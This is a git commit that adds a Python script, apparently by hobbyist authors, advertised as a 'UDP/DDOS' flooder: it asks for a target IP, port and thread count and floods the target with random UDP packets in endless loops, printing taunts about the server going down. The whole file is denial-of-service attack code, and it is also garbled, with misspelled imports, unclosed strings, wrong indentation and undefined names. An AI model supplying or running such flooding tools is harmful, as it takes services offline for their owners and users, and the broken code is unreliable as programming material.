7ca63c1df3776b2ca146a45041e92a31067beb7b
WilTodZ <96977564+WilTodZ@users.noreply.github.com>
2022-01-08 07:03:19 +0700

    Add files via upload

---
+++ DenTod.py
@@ -0,0 +1,59 @@
+#Dennis X William
+import os
+import choice
+import theards
+import random
+import times
+
+ os.system("clear")
+print 
+("UDP/DDOS by    - - > Dennis ")
+print
+("Editions   - - > William    ")
+print 
+(" Ngintid Yang Abuse
+ 
+print("""
+ip = str(input(" Masukan Ip  "  ;))
+port = int(input(" Masukan Port " ;))
+choice = str(input(" Masukan Udp Y/N "  ;))
+theards = int(input(" Masukan Packets Terserah "  ;))
+times = int(input(" Masukan Theards Terserah "  ;)
+)
+
+
+def naybae():
+    data = random._urandom(1024)
+    i = random.choice(("[dennis]","[dennis]","[dennis]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for z in range(time):
+                s.sendto(data,addr)
+            print(i +" | Tok.. Tok.. Paket dari dennis datang |")
+        except:
+            print("[!] | Server Down Kasihan !!!!! |")
+
+def naybae2():
+    data = random._urandom(16)
+    i = random.choice(("[dennis]","[dennis]","[dennis]"))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INIT, socket.SOCK_DGRAM)
+            s.connect((ip,port))
+            s.send(data)
+            for z in range(time):
+                s.send(data)
+            print(i +"| dennis nih boss... |")
+        except:
+            s.close()
+            print("[*] | Down lagi lol.... |")
+            
+ for a in range(threds):
+    if choice == "y":
+        th = threading.Thread(target = naybae)
+        th.start()
+    else:
+        th = threading.Thread(target = naybae2)
+        th.start
